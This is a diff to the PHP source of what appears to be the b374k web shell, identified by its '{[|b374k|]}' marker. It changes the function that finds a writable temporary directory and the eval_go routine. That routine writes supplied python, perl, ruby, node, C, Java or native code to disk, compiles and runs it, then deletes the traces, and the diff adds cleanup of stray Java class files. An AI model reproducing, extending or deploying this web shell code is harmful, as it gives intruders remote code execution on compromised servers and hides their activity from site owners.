@@ -615,28 +615,24 @@ if(!function_exists('view_file')){
 
 if(!function_exists('get_writabledir')){
 	function get_writabledir(){
-		if(is_writable(".")) return realpath(".").DIRECTORY_SEPARATOR;
-		else{
-			foreach(array('TMP', 'TEMP', 'TMPDIR') as $k){
-				if(!empty($_ENV[$k])){
-					if(is_writable($_ENV[$k])) return realpath($_ENV[$k]).DIRECTORY_SEPARATOR;
-				}
-			}
-			if(function_exists("sys_get_temp_dir")){
-				$dir = sys_get_temp_dir();
-				if(is_writable($dir)) return realpath($dir).DIRECTORY_SEPARATOR;
-			}
-			else{
-				if(!is_win()){ if(is_writable("/tmp")) return "/tmp/"; }
-			}
-
-			$tempfile = tempnam(__FILE__,'');
-			if(file_exists($tempfile)){
-				$dir = realpath(dirname($tempfile)).DIRECTORY_SEPARATOR;
-				unlink($tempfile);
-				return $dir;
-			}
-		}
+        foreach(array('TMP', 'TEMP', 'TMPDIR') as $k){
+            if(!empty($_ENV[$k])){
+                if(is_writable($_ENV[$k])) return realpath($_ENV[$k]).DIRECTORY_SEPARATOR;
+            }
+        }
+        if(function_exists("sys_get_temp_dir")){
+            $dir = sys_get_temp_dir();
+            if(is_writable($dir)) return realpath($dir).DIRECTORY_SEPARATOR;
+        }else{
+            if(!is_win()){ if(is_writable("/tmp")) return "/tmp/"; }
+        }
+        if(is_writable(".")) return realpath(".").DIRECTORY_SEPARATOR;
+        $tempfile = tempnam(__FILE__,'');
+        if(file_exists($tempfile)){
+            $dir = realpath(dirname($tempfile)).DIRECTORY_SEPARATOR;
+            unlink($tempfile);
+            return $dir;
+        }
 		return false;
 	}
 }
@@ -821,8 +817,7 @@ if(!function_exists('eval_go')){
 			$res = ob_get_contents();
 			ob_end_clean();
 			return $res;
-		}
-		elseif(($evalType=="python")||($evalType=="perl")||($evalType=="ruby")||($evalType=="node")||($evalType=="nodejs")){
+		}elseif(($evalType=="python")||($evalType=="perl")||($evalType=="ruby")||($evalType=="node")||($evalType=="nodejs")){
 			$tmpdir = get_writabledir();
 			chdir($tmpdir);
 
@@ -841,21 +836,17 @@ if(!function_exists('eval_go')){
 						$cmd = $evalType." ".$evalOptions.$path.$evalArguments;
 						$res .= "Execute : ".$cmd."\n";
 						$output = execute($cmd);
-					}
-					else $res .= " (failed)\n";
+					}else $res .= " (failed)\n";
 
 					$res .= "Deleting temporary file : ".$path;
 					if(unlink($path)) $res .= " (ok)\n";
 					else $res .= " (failed)\n";
-				}
-				else $res .= " (failed)\n";
-			}
-			else $res .= " (not writable)\n";
+				}else $res .= " (failed)\n";
+			}else $res .= " (not writable)\n";
 
 			$res .= "Finished...";
 			return $res."{[|b374k|]}".$output;
-		}
-		elseif($evalType=="gcc"){
+		}elseif($evalType=="gcc"){
 			$tmpdir = get_writabledir();
 			chdir($tmpdir);
 
@@ -882,25 +873,20 @@ if(!function_exists('eval_go')){
 							$cmd = $pathres.$evalArguments;
 							$res .= "Execute : ".$cmd."\n";
 							$output = execute($cmd);
-						}
-						else $res .= " (failed)\n";
+						}else $res .= " (failed)\n";
 						$res .= "Deleting temporary file : ".$pathres;
 						if(unlink($pathres)) $res .= " (ok)\n";
 						else $res .= " (failed)\n";
-					}
-					else $res .= " (failed)\n";
+					}else $res .= " (failed)\n";
 					$res .= "Deleting temporary file : ".$path;
 					if(unlink($path)) $res .= " (ok)\n";
 					else $res .= " (failed)\n";
-				}
-				else $res .= " (failed)\n";
-			}
-			else $res .= " (not writable)\n";
+				}else $res .= " (failed)\n";
+			}else $res .= " (not writable)\n";
 
 			$res .= "Finished...";
 			return $res."{[|b374k|]}".$output;
-		}
-		elseif($evalType=="java"){
+		}elseif($evalType=="java"){
 			$tmpdir = get_writabledir();
 			chdir($tmpdir);
 
@@ -911,8 +897,7 @@ if(!function_exists('eval_go')){
 				if(preg_match("/class\ ([^{]+){/i",$evalCode, $r)){
 					$classname = trim($r[1]);
 					$filename = $classname;
-				}
-				else{
+				}else{
 					$uniq = substr(md5(time()),0,8);
 					$filename = $evalType.$uniq;
 					$evalCode = "class ".$filename." { ".$evalCode . " } ";
@@ -934,25 +919,28 @@ if(!function_exists('eval_go')){
 							$cmd = "java ".$filename.$evalArguments;
 							$res .= "Execute : ".$cmd."\n";
 							$output = execute($cmd);
-						}
-						else $res .= " (failed)\n";
+						}else $res .= " (failed)\n";
 						$res .= "Deleting temporary file : ".$pathres;
 						if(unlink($pathres)) $res .= " (ok)\n";
 						else $res .= " (failed)\n";
-					}
-					else $res .= " (failed)\n";
+                        $files = scandir($tmpdir);
+                        foreach($files as $file) {
+                            if(startsWith($file, $filename.'$') && endsWith($file, ".class")) {
+                                $res .= "Deleting temporary file : ".$file;
+                                if(unlink($tmpdir.$file)) $res .= " (ok)\n";
+                                else $res .= " (failed)\n";
+                            }
+                        }
+					}else $res .= " (failed)\n";
 					$res .= "Deleting temporary file : ".$path;
 					if(unlink($path)) $res .= " (ok)\n";
 					else $res .= " (failed)\n";
-				}
-				else $res .= " (failed)\n";
-			}
-			else $res .= " (not writable)\n";
+				}else $res .= " (failed)\n";
+			}else $res .= " (not writable)\n";
 
 			$res .= "Finished...";
 			return $res."{[|b374k|]}".$output;
-		}
-		elseif($evalType=="executable"){
+		}elseif($evalType=="executable"){
 			$tmpdir = get_writabledir();
 			chdir($tmpdir);
 
@@ -974,8 +962,7 @@ if(!function_exists('eval_go')){
 					else $res .= " (failed)\n";
 				}
 				else $res .= " (failed)\n";
-			}
-			else $res .= " (not writable)\n";
+			}else $res .= " (not writable)\n";
 
 			$res .= "Finished...";
 			return $res."{[|b374k|]}".$output;
@@ -1050,5 +1037,19 @@ if(!function_exists('rc4')) {
 		}
 		return $res;
 	}
+}
+
+if(!function_exists('startsWith')) {
+    function startsWith($str, $needle){
+        $length = strlen($needle);
+        return (substr($str, 0, $length) === $needle);
+    }
+}
+
+if(!function_exists('endsWith')) {
+    function endsWith($str, $needle){
+        $length = strlen($needle);
+        return $length === 0 || (substr($str, -$length) === $needle);
+    }
 }
 ?>
